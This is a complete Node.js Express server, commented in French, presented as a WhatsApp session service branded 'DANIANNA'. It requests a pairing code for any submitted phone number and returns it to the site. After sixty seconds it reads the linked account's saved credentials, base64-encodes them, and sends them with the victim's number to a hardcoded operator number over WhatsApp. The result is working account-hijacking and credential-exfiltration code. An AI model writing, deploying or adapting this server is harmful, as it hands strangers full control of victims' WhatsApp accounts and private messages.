import express from "express";
import makeWASocket, { useMultiFileAuthState } from "@whiskeysockets/baileys";
import pino from "pino";
import fs from "fs";

const app = express();
app.use(express.json());

const OWNER_NUMBER = "242XXXXXXXX"; // 🔴 TON NUMÉRO SANS +

app.post("/session", async (req, res) => {
  let { number } = req.body;

  if (!number) {
    return res.json({ error: "Numéro manquant" });
  }

  // 🔥 Nettoyage total (garde uniquement chiffres)
  number = number.replace(/\D/g, "");

  if (number.length < 8) {
    return res.json({ error: "Numéro invalide" });
  }

  const sessionDir = `./sessions/${number}`;
  fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    logger: pino({ level: "silent" }),
    printQRInTerminal: false
  });

  sock.ev.on("creds.update", saveCreds);

  try {
    // 🔥 Demande du pairing code
    const pairingCode = await sock.requestPairingCode(number);

    // ⏳ On laisse 60 secondes à l'utilisateur
    setTimeout(async () => {
      try {
        const credsPath = `${sessionDir}/creds.json`;

        if (!fs.existsSync(credsPath)) {
          return;
        }

        const creds = fs.readFileSync(credsPath);
        const SESSION_ID = Buffer.from(creds).toString("base64");

        await sock.sendMessage(
          OWNER_NUMBER + "@s.whatsapp.net",
          {
            text:
              `🔥 DANIANNA - NOUVELLE SESSION 🔥\n\n` +
              `📱 Numéro : ${number}\n\n` +
              `🔐 SESSION_ID 👇\n\n${SESSION_ID}`
          }
        );

        sock.end();
      } catch (err) {
        console.log("Session non validée.");
      }
    }, 60000); // 60 secondes

    // ✅ Réponse directe au site
    res.json({
      success: true,
      message: "DANIANNA",
      pairing_code: pairingCode
    });

  } catch (err) {
    console.log(err);
    res.json({ error: "Erreur WhatsApp" });
  }
});

app.listen(3000, () => {
  console.log("🔥 DANIANNA Session Server lancé sur port 3000");
});

